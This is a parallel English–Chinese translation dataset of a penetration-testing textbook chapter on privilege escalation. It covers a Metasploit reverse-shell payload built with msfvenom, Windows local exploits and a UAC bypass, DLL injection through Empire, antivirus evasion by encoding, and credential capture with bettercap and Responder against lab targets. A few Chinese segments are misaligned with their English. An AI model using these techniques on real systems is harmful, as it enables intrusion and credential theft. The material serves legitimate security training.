- en: '12'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '12'
- en: Privilege Escalations
  id: totrans-1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 权限提升
- en: Privilege escalation is the process of going from a relatively low level of
    access rights to gaining the privileges of an administrator, the system, or even
    greater access privileges. It allows the penetration tester to own all aspects
    of a system’s operations. More importantly, obtaining some access privileges will
    allow testers to control all systems across a network. As vulnerabilities become
    more difficult to find and exploit, a significant amount of research has been
    conducted into privilege escalation as a means of ensuring a successful penetration
    test.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 权限提升是指从较低的访问权限提升到获得管理员权限、系统权限，甚至更高访问权限的过程。它允许渗透测试人员完全控制系统的所有操作。更重要的是，获得某些访问权限将使测试人员能够控制网络中的所有系统。随着漏洞变得越来越难以发现和利用，许多研究已经专注于权限提升，作为确保渗透测试成功的手段。
- en: 'In this chapter, we will look at the following topics:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将讨论以下内容：
- en: Common escalation methodology
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 常见的权限提升方法
- en: Local system escalation
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 本地系统权限提升
- en: DLL injection
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: DLL注入
- en: Credential harvesting through sniffing and escalation
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过嗅探和权限提升进行凭证收集
- en: Golden ticket attack on Kerberos
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Kerberos上的金票攻击
- en: Active Directory access rights
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Active Directory访问权限
- en: Overview of the common escalation methodology
  id: totrans-10
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 常见权限提升方法概述
- en: Everything that starts with a methodology offers an approach to a problem solution.
    In this section, we will go through the common escalation methodology utilized
    by attackers during a red teaming exercise, or penetration testing.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 一切从方法论开始，提供了一种问题解决的方法。在本节中，我们将介绍攻击者在红队演习或渗透测试中使用的常见权限提升方法。
- en: '*Figure 12.1* depicts the methodology that can be used:'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: '*图12.1* 描述了可以使用的方法论：'
- en: '![Diagram  Description automatically generated with low confidence](../Images/B17765_12_01.png)'
  id: totrans-13
  prefs: []
  type: TYPE_IMG
  zh: '![Diagram  Description automatically generated with low confidence](../Images/B17765_12_01.png)'
- en: 'Figure 12.1: A typical user privilege hierarchy'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.1：典型的用户权限层级
- en: In line with the cyber kill chain methodology, the actions taken to achieve
    the objective include escalation of privilege to maintain persistence to the target
    environment.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 根据网络攻击链的方法论，为了达到目标，采取的行动包括提升权限以保持对目标环境的持续性访问。
- en: 'The following are the types of user accounts that are found in any target system:'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是目标系统中可能找到的用户账户类型：
- en: '**Normal user**: Typical access through a backdoor run at the level of the
    user who executes the backdoor. These are the normal users of the system (Windows
    or Unix) and are either local users or domain users with limited system access
    to perform only tasks that are allowed for them.'
  id: totrans-17
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**普通用户**：通过在执行后门的用户级别运行后门获得的典型访问权限。这些是系统（Windows或Unix）的普通用户，可以是本地用户或具有有限系统访问权限的域用户，执行的任务仅限于他们被允许执行的范围。'
- en: '**Local administrator**: Local administrators are system account holders who
    have the privilege to run system configuration changes.'
  id: totrans-18
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**本地管理员**：本地管理员是具有运行系统配置更改权限的系统账户持有者。'
- en: '**Delegated administrator**: Delegated administrators are local user accounts
    with administrator privileges. Example account operators or backup operators are
    typical groups used in Active Directory environments to delegate administrative
    tasks.'
  id: totrans-19
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**委派管理员**：委派管理员是具有管理员权限的本地用户账户。例如，账户操作员或备份操作员是Active Directory环境中常用于委派管理任务的典型组。'
- en: '**Domain administrator**: Domain administrators are users who can administer
    the domains that they are a member of.'
  id: totrans-20
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**域管理员**：域管理员是能够管理其所在域的用户。'
- en: '**Enterprise administrator**: Enterprise administrators are accounts that have
    the most privileges for maintaining the entire forest in an Active Directory.'
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**企业管理员**：企业管理员是拥有维护整个Active Directory森林权限的账户。'
- en: '**Schema administrator**: Schema administrators are users who can configure
    the schema of the forest. The reason schema admins are not included as the most
    privileged account is because attackers cannot add users to any other groups:
    that would limit the access level to modifying the Active Directory forest.'
  id: totrans-22
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**架构管理员**：架构管理员是能够配置森林架构的用户。架构管理员之所以不被视为最具特权的账户，是因为攻击者无法将用户添加到其他组中：这将限制修改Active
    Directory森林的访问权限。'
- en: Escalating from domain user to system administrator
  id: totrans-23
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 从域用户提升到系统管理员
- en: 'In most cases, attackers performing console-level attacks or social engineering
    attacks might gain access to a normal domain user who is not a local administrator,
    which leaves them with access only to a limited level of privileges. This can
    be bypassed and exploited to gain system-level access on the victim machine without
    having to be a local admin. We will utilize Windows 2008 Metasploitable3 to perform
    the local privilege escalation. Following are the steps involved in performing
    the attack:'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 在大多数情况下，执行控制台级攻击或社交工程攻击的攻击者可能会获得一个普通域用户的访问权限，而该用户并不是本地管理员，这使他们只能访问有限的权限级别。可以绕过这一点，并利用该漏洞在受害者机器上获得系统级访问权限，而不必成为本地管理员。我们将利用Windows
    2008 Metasploitable3执行本地特权提升攻击。以下是执行该攻击的步骤：
- en: Create an executable with a payload using `msfvenom` by running `sudo msfvenom
    –p windows/meterpreter/reverse_tcp LHOST=<Kali IP> LPORT=<Port No> -f exe –o Output.exe.`
    from the Kali terminal.
  id: totrans-25
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用`msfvenom`创建一个带有效载荷的可执行文件，运行`sudo msfvenom –p windows/meterpreter/reverse_tcp
    LHOST=<Kali IP> LPORT=<Port No> -f exe –o Output.exe.`来自Kali终端。
- en: Log in to Metasploitable3 using the `normaluser` user account with the password
    that we created in *Chapter 1,* *Goal-Based Penetration Testing*. Upload the file
    to the target either through file share or by simply running the simple HTTP server
    using Python (`python3 -m http.server <custom port number>`).
  id: totrans-26
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用在*第1章*中创建的`normaluser`用户账户登录Metasploitable3，并通过文件共享或简单运行Python HTTP服务器（`python3
    -m http.server <custom port number>`）将文件上传到目标。
- en: Once the file is in the target, execution of the file as a normal user should
    provide the reverse shell on Kali Linux. Ensure you start the Metasploit listener
    prior to the execution of the payload.
  id: totrans-27
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦文件上传到目标，作为普通用户执行该文件应提供反向shell到Kali Linux。在执行有效载荷之前，请确保先启动Metasploit监听器。
- en: When attackers initially gain access to the system using the normal user and
    try to run system-level commands, you will receive the response `access denied`
    or `no privilege available to run the commands on the target system`.
  id: totrans-28
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当攻击者初步使用普通用户身份访问系统并尝试运行系统级命令时，您将收到`access denied`或`no privilege available to
    run the commands on the target system`的响应。
- en: This can be verified by running the `getsystem` command from the Meterpreter
    console, as shown in *Figure 12.2*:![](../Images/B17765_12_02.png)
  id: totrans-29
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这可以通过从Meterpreter控制台运行`getsystem`命令来验证，如*图12.2*所示：![](../Images/B17765_12_02.png)
- en: 'Figure 12.2: Meterpreter shell running getsystem'
  id: totrans-30
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图12.2：Meterpreter shell运行getsystem命令
- en: 'We will explore this local vulnerability that exists in older versions of Windows
    such as Windows 2008/7\. We will use the latest local exploit, `ms18_8120_win32k_privesc`,
    exploiting the Win32k component, which doesn’t handle the object’s property in
    memory. You can move the existing Meterpreter session to the background to utilize
    post-exploit modules via the following steps:'
  id: totrans-31
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们将探索存在于旧版本Windows（如Windows 2008/7）中的本地漏洞。我们将使用最新的本地漏洞利用工具`ms18_8120_win32k_privesc`，该工具利用Win32k组件的漏洞，该组件未正确处理内存中的对象属性。您可以将现有的Meterpreter会话移到后台，以便通过以下步骤利用后利用模块：
- en: '[PRE0]'
  id: totrans-32
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Successful exploitation of the vulnerability should open up another shell with
    a high privilege level, as shown in *Figure 12.3*:![](../Images/B17765_12_03.png)
  id: totrans-33
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 成功利用该漏洞应该会打开另一个具有高权限级别的shell，如*图12.3*所示：![](../Images/B17765_12_03.png)
- en: 'Figure 12.3: Exploiting local Windows privilege escalation vulnerability on
    Metasploitable3'
  id: totrans-34
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图12.3：在Metasploitable3上利用本地Windows特权提升漏洞
- en: Now the new session must provide you with access to the system level as NT AUTHORITY\SYSTEM,
    which will enable attackers to create a local administrator-level user, as shown
    in *Figure 12.4*, and move laterally by extracting hash dumps using the `hashdump`
    command from the Meterpreter shell or enable RDP and log in with the new admin
    account:![](../Images/B17765_12_04.png)
  id: totrans-35
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，新的会话必须为您提供以NT AUTHORITY\SYSTEM身份访问系统的权限，这将使攻击者能够创建一个本地管理员级别的用户，如*图12.4*所示，并通过从Meterpreter
    shell中使用`hashdump`命令提取哈希转储或启用RDP并使用新管理员账户登录，从而横向移动：![](../Images/B17765_12_04.png)
- en: 'Figure 12.4: Successful access to Metasploitable3 with admin privileges'
  id: totrans-36
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图12.4：成功以管理员权限访问Metasploitable3
- en: Local system escalation
  id: totrans-37
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 本地系统提权
- en: In Windows 10, we can utilize a different technique to bypass the existing privilege.
    One of the drawbacks of this attack is, in order to get system-level access, the
    affected local user must be part of the local administrators group.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 在Windows 10中，我们可以利用一种不同的技术来绕过现有的权限。一项此攻击的缺点是，为了获得系统级访问权限，受影响的本地用户必须是本地管理员组的成员。
- en: 'Attackers will be able to run the Meterpreter shell only in the context of
    the user. To bypass this restriction, we can leverage multiple post-exploit modules.
    We will be sending the `background` command to our Meterpreter shell to run the
    post exploit module. In this example, we will utilize the `bypassuac_fodhelper`
    post-exploit module, as shown in *Figure 12.5*:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者只能在用户的上下文中运行 Meterpreter shell。为了绕过这个限制，我们可以利用多个后渗透模块。我们将发送 `background`
    命令到我们的 Meterpreter shell，以运行后渗透模块。在本例中，我们将利用 `bypassuac_fodhelper` 后渗透模块，如 *图
    12.5* 所示：
- en: '[PRE1]'
  id: totrans-40
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: '![](../Images/B17765_12_05.png)'
  id: totrans-41
  prefs: []
  type: TYPE_IMG
  zh: 一旦我们创建了后门 DLL 文件，就可以利用现有的 Meterpreter 会话来运行 PowerShell。攻击者可以通过在终端中运行以下命令来创建一个
    PowerShell 负载：
- en: 'Figure 12.5: Exploiting Windows 10 local privilege escalation'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.5：利用 Windows 10 本地权限提升漏洞
- en: 'The `bypassuac_fodhelper` module in the Meterpreter shell will utilize the
    existing session to provide a more privileged Meterpreter shell, as shown in *Figure
    12.6*:'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: Meterpreter shell 中的 `bypassuac_fodhelper` 模块将利用现有会话提供更高权限的 Meterpreter shell，如
    *图 12.6* 所示：
- en: '![](../Images/B17765_12_06.png)'
  id: totrans-44
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_06.png)'
- en: 'Figure 12.6: Successful access to Windows 10 with SYSTEM privileges'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.6：成功以 SYSTEM 权限访问 Windows 10
- en: We have successfully run the local exploit to gain the SYSTEM level privileges
    from a low-privileged user. In the next section, we will exploit the user with
    local administrative privileges to escalate them to a SYSTEM level user.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经成功运行了本地漏洞，从低权限用户提升到 SYSTEM 级别的权限。在下一节中，我们将利用本地管理员权限的用户进行提升，最终将其提升为 SYSTEM
    级别的用户。
- en: Escalating from administrator to system
  id: totrans-47
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 从管理员权限提升到系统权限
- en: 'Administrator privileges allow an attacker to create and manage accounts and
    access most data available on a system. However, some complex functionality mandates
    that the requester have system-level access privileges. There are several ways
    to continue this escalation to the system level. The easiest way is to run `PsExec`
    to get system-level access by uploading `PsExec` to the desired folder and run
    the following command as a local administrator:'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 管理员权限允许攻击者创建和管理账户，并访问系统上大多数数据。然而，某些复杂的功能要求请求者具有系统级别的访问权限。有几种方法可以继续提升到系统级别，最简单的方式是运行
    `PsExec` 来获取系统级访问权限，方法是将 `PsExec` 上传到目标文件夹，并作为本地管理员运行以下命令：
- en: '[PRE2]'
  id: totrans-49
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'This command should open up another Command Prompt as the system user, as shown
    in *Figure 12.7*:'
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 此命令应以系统用户身份打开另一个命令提示符，如 *图 12.7* 所示：
- en: '![](../Images/B17765_12_07.png)'
  id: totrans-51
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_07.png)'
- en: 'Figure 12.7: Escalating from local administrator to SYSTEM using Psexec'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.7：使用 Psexec 从本地管理员提升到 SYSTEM
- en: DLL injection
  id: totrans-53
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: DLL 注入
- en: '**DLL** (**Dynamic Link Library**) injection is another easy technique that
    is utilized by attackers to run remote code in the context of the address space
    of another process. This process must be running with excess privileges that can
    then be used to escalate privilege in the form of a DLL file.'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: '**DLL**（**动态链接库**）注入是另一种简单的技术，攻击者利用它在另一个进程的地址空间中运行远程代码。该进程必须以超出权限的方式运行，这些权限随后可以用于通过
    DLL 文件提升权限。'
- en: 'Metasploit has a specific module you can use to perform DLL injection. The
    only thing the attacker needs to do is link the existing Meterpreter session and
    specify the `PID` of the process and the path of the DLL. We will explore another
    way and utilize the PowerShell DLL injection module from the Empire tool. You
    can create a DLL with the payload via `msfvenom`:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 提供了一个特定的模块，可以用于执行 DLL 注入。攻击者需要做的就是链接现有的 Meterpreter 会话，并指定进程的 `PID`
    和 DLL 的路径。我们将探索另一种方式，并利用 Empire 工具中的 PowerShell DLL 注入模块。你可以通过 `msfvenom` 创建一个带有负载的
    DLL：
- en: '[PRE3]'
  id: totrans-56
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'Once we have the backdoor DLL file created, we can utilize the existing Meterpreter
    session to run PowerShell. Attackers can create a PowerShell payload by running
    the following commands in the terminal:'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: '![](../Images/B17765_12_08.png)'
- en: '[PRE4]'
  id: totrans-58
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'That should provide us with the PowerShell payload that we can execute on the
    target. In this case, we will utilize Windows 10 as an example and run the PowerShell
    script directly from the Meterpreter shell, as seen in *Figure 12.8*:'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 这应该为我们提供可以在目标上执行的 PowerShell 负载。在本例中，我们将以 Windows 10 为例，直接从 Meterpreter shell
    运行 PowerShell 脚本，如 *图 12.8* 所示：
- en: '![](../Images/B17765_12_08.png)'
  id: totrans-60
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_05.png)'
- en: 'Figure 12.8: Executing Empire agent payload from Meterpreter'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.8：从 Meterpreter 执行 Empire 代理负载
- en: 'Successful execution of PowerShell should report an agent to the Empire console.
    Attackers can validate that by running the `agents` command and actively executing
    commands on the agent type `interact` with the agent name within Empire, as shown
    in *Figure 12.9*:'
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 成功执行 PowerShell 后，应该会向 Empire 控制台报告一个代理。攻击者可以通过运行 `agents` 命令并在 Empire 中使用代理名称通过
    `interact` 命令与代理进行交互来验证这一点，如 *图 12.9* 所示：
- en: '![](../Images/B17765_12_09.png)'
  id: totrans-63
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_09.png)'
- en: 'Figure 12.9: Successful agent reporting to the Empire client console'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.9：成功的代理向 Empire 客户端控制台报告
- en: 'Testers can now upload the DLL file that we created to the target system; this
    will upload to the folder from where the PowerShell script was executed:'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 测试人员现在可以将我们创建的 DLL 文件上传到目标系统；这将上传到执行 PowerShell 脚本的文件夹中：
- en: '![](../Images/B17765_12_10.png)'
  id: totrans-66
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_10.png)'
- en: 'Figure 12.10: Uploading the malicious DLL to the target'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.10：将恶意 DLL 上传到目标
- en: 'Running the `ps` command in the PowerShell Empire terminal should provide us
    with the list of current processes running on the target. Select the right process,
    which is running as `NT AUTHORITY/SYSTEM`, and execute the following commands
    in the PowerShell Empire terminal:'
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 在 PowerShell Empire 终端中运行 `ps` 命令，应该会列出目标上当前正在运行的进程。选择正确的进程（该进程以 `NT AUTHORITY/SYSTEM`
    运行），然后在 PowerShell Empire 终端中执行以下命令：
- en: '[PRE5]'
  id: totrans-69
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: If the testers cannot see the system process owner when running the `ps` command,
    then run the Empire PowerShell payload as local administrator.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 如果测试人员在运行 `ps` 命令时无法看到系统进程所有者，则应以本地管理员身份运行 Empire PowerShell 有效负载。
- en: The majority of antivirus/anti-malware/EDR will detect this method easily; however,
    it is advised that the payload of the DLL is encoded with multiple iterations.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数防病毒/反恶意软件/EDR 系统都能轻松检测到此方法；然而，建议对 DLL 的有效负载进行多次编码。
- en: 'Once the DLL file is injected into a running process, attackers should be able
    to see an agent reporting back as a privileged user, as shown in *Figure 12.11*:'
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦 DLL 文件注入到正在运行的进程中，攻击者应该能够看到一个以特权用户身份报告回来的代理，如 *图 12.11* 所示：
- en: '![](../Images/B17765_12_11.png)'
  id: totrans-73
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_11.png)'
- en: 'Figure 12.11: Successful upload of the malicious DLL to the target'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.11：成功将恶意 DLL 上传到目标
- en: 'Once you have successfully invoked the DLL, the payload must be executed and
    must have opened up a reverse shell as the system-level user, as shown in *Figure
    12.12*:'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦成功调用 DLL，有效负载必须执行，并且必须以系统级别用户身份打开反向 Shell，如 *图 12.12* 所示：
- en: '![](../Images/B17765_12_12.png)'
  id: totrans-76
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_12.png)'
- en: 'Figure 12.12: Reverse shell on Meterpreter through successful DLL injection
    using PowerShell Empire'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.12：通过 PowerShell Empire 成功的 DLL 注入进行的反向 Shell
- en: We have successfully performed the DLL injection to gain a highly privileged
    SYSTEM account. In the next section, we will explore a different approach to harvest
    credentials and escalate privileges.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经成功地进行了 DLL 注入，以获得一个具有高度特权的 SYSTEM 账户。在下一节中，我们将探索另一种收集凭据并提升特权的方法。
- en: Credential harvesting and escalation attacks
  id: totrans-79
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 凭据收集和特权提升攻击
- en: Credential harvesting is the process of identifying usernames, passwords, and
    hashes that can be utilized to achieve the objective set by the organization for
    a penetration testing/red team exercise. In this section, we will walk through
    three different types of credential harvesting mechanisms that are typically used
    by attackers in Kali Linux.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 凭据收集是识别可以用来实现渗透测试/红队演练目标的用户名、密码和哈希值的过程。在本节中，我们将演示攻击者在 Kali Linux 中通常使用的三种不同的凭据收集机制。
- en: Password sniffers
  id: totrans-81
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 密码嗅探器
- en: Password sniffers are a set of tools/scripts that typically perform man-in-the-middle
    attacks by discovery, spoofing, sniffing traffic, and by proxying. From our previous
    experience, we noted that most organizations do not utilize SSL internally; Wireshark
    revealed multiple usernames and passwords.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 密码嗅探器是一组通常通过发现、欺骗、嗅探流量和代理方式执行中间人攻击的工具/脚本。根据我们之前的经验，我们注意到大多数组织内部没有使用 SSL；Wireshark
    显示了多个用户名和密码。
- en: 'In this section, we will explore `bettercap` to capture SSL traffic on the
    network so that we can capture the credentials of network users. `bettercap` is
    similar to the previous-generation `ettercap` command, with the additional capability
    to perform network-level spoofing and sniffing. It can be downloaded to Kali Linux
    by running `sudo apt install bettercap` from the terminal. `bettercap` underwent
    a lot of development between 2018 and 2020 to make it compatible with the user
    interface and enabled caplet use. Caplets are just `.cap` files that can be scripted
    to achieve an objective for interactive sessions; this can be installed or updated
    by running a simple command on the terminal: `sudo apt install bettercap-caplets`.'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将探索 `bettercap` 来捕获网络上的 SSL 流量，以便捕获网络用户的凭据。`bettercap` 类似于上一代的 `ettercap`
    命令，增加了网络级伪造和嗅探的能力。可以通过在终端中运行 `sudo apt install bettercap` 来将其下载到 Kali Linux。`bettercap`
    在 2018 到 2020 年间经过了大量的开发，以使其兼容用户界面并启用了 caplet 使用。Caplet 只是 `.cap` 文件，可以通过脚本在交互式会话中实现目标；可以通过在终端中运行简单命令
    `sudo apt install bettercap-caplets` 来安装或更新它。
- en: 'This tool can be utilized for a more effective man-in-the-middle attack on
    a given internal network. In this example, we will utilize one caplet with the
    following script to capture passwords with an ARP and DNS spoof within the `bettercap`
    shell:'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 此工具可用于对给定的内部网络进行更有效的中间人攻击。在此示例中，我们将使用一个 caplet，脚本如下，通过 `bettercap` shell 执行
    ARP 和 DNS 欺骗来捕获密码：
- en: '[PRE6]'
  id: totrans-85
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: '`bettercap` must be able to sniff all the traffic on the target network without
    any problems, as *Figure 12.13* showcases:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: '`bettercap` 必须能够顺利嗅探目标网络上的所有流量，如*图 12.13*所展示：'
- en: '![](../Images/B17765_12_13.png)'
  id: totrans-87
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_13.png)'
- en: 'Figure 12.13: Capturing plaintext passwords on HTTP protocol using bettercap'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.13：使用 bettercap 捕获 HTTP 协议的明文密码
- en: 'To strip SSL traffic, we can utilize the `https.proxy` module, as follows:'
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 为了剥离 SSL 流量，我们可以利用 `https.proxy` 模块，如下所示：
- en: '[PRE7]'
  id: totrans-90
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'The `hstshijack` caplet will enable attackers to view the requests when a web
    server redirects the HTTP traffic to HTTPS and attackers can leverage the redirects
    to force the web server to respond on HTTP. The preceding commands in `bettercap`
    must enable attackers to see HTTPS traffic, as shown in *Figure 12.14*:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: '`hstshijack` caplet 将使攻击者能够查看当 Web 服务器将 HTTP 流量重定向到 HTTPS 时的请求，攻击者可以利用重定向迫使
    Web 服务器响应 HTTP。`bettercap` 中的前述命令必须使攻击者能够查看 HTTPS 流量，如*图 12.14*所示：'
- en: '![](../Images/B17765_12_14.png)'
  id: totrans-92
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_14.png)'
- en: 'Figure 12.14: Sniffing all the encrypted URLs using the sslstrip caplet in
    Bettercap'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.14：使用 Bettercap 中的 sslstrip caplet 嗅探所有加密的 URL
- en: Penetration testers should be careful when using `bettercap`, as this will pause
    the entire network your Kali Linux is connected to when `arp spoof on` is run.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 渗透测试人员在使用 `bettercap` 时应小心，因为运行 `arp spoof on` 时会暂停 Kali Linux 所连接的整个网络。
- en: Responder
  id: totrans-95
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Responder
- en: 'Responder is an in-built Kali Linux tool for **Link-Local Multicast Name Resolution**
    (**LLMNR**) and **NetBIOS Name Service** (**NBT-NS**) that responds to specific
    NetBIOS queries based on the file server request. This tool can be launched by
    running `responder -I eth0 (ethernet adapter name of your network that you want
    to) -h` in the terminal, as shown in *Figure 12.15*:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: Responder 是 Kali Linux 中内置的工具，用于**链路-本地多播名称解析**（**LLMNR**）和**NetBIOS 名称服务**（**NBT-NS**），它根据文件服务器请求响应特定的
    NetBIOS 查询。通过在终端中运行 `responder -I eth0 (您网络的以太网适配器名称) -h` 可以启动此工具，如*图 12.15*所示：
- en: '![](../Images/B17765_12_15.png)'
  id: totrans-97
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_15.png)'
- en: 'Figure 12.15: The Responder tool’s main menu'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.15：Responder 工具的主菜单
- en: 'Responder has the ability to do the following:'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: Responder 具备以下功能：
- en: Check for a local host file that includes any specific DNS entries
  id: totrans-100
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 检查本地主机文件，看看是否包含任何特定的 DNS 条目
- en: Automatically perform a **DNS** query on the selected network
  id: totrans-101
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 自动执行选定网络上的**DNS**查询
- en: Use **LLMNR/NBT-NS** to send out broadcast messages to the selected network
  id: totrans-102
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 **LLMNR/NBT-NS** 向选定网络发送广播消息
- en: 'Attackers on the same network can fire up Responder on the network by running
    `sudo responder –I eth0 –wF –v` in the Kali terminal, as shown in *Figure 12.16*.
    Responder has the ability to set up multiple server types by itself:'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 同一网络上的攻击者可以通过在 Kali 终端中运行 `sudo responder –I eth0 –wF –v` 启动网络上的 Responder，如*图
    12.16*所示。Responder 能够自行设置多种服务器类型：
- en: '![](../Images/B17765_12_16.png)'
  id: totrans-104
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_16.png)'
- en: 'Figure 12.16: Running Responder on the local network to perform a MiTM attack'
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.16：在本地网络上运行 Responder 执行中间人攻击
- en: In this example, let’s say we venom the entire network if a device tries to
    access the fileserver `\\<FILESERVER>\\`. This will then redirect to the responder-hosted
    SMB server to capture the NTLM username and hash.
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，假设我们如果设备尝试访问文件服务器 `\\<FILESERVER>\\`，我们就使整个网络中毒。这样，访问请求就会被重定向到 Responder
    托管的 SMB 服务器，以捕获 NTLM 用户名和哈希值。
- en: 'If the victims try and access the Kali Linux IP or the hostname that is poised
    and redirected to the responder, the victims will have the popup shown in *Figure
    12.7* and Responder will capture the username and NTLM hash of the value that
    is submitted:'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 如果受害者尝试访问 Kali Linux IP 或已中毒并重定向到 Responder 的主机名，受害者会看到 *图 12.7* 中显示的弹窗，且 Responder
    会捕获提交的用户名和 NTLM 哈希值：
